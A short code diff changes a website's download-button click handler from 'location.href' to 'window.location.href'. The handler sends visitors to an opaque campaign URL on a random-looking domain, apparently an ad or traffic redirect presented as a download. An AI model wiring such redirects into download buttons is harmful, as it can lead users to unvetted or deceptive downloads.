@@ -6,6 +6,6 @@ AOS.init({
 
 // Placeholder for download functionality
 document.querySelector('.download-btn').addEventListener('click', () => {
-  location.href =
+  window.location.href =
     'https://uplxekx.com/fd2/?campaign=619d1b4ee5636f6c&p1=&p2=&source=adwords&site=mysite';
 });
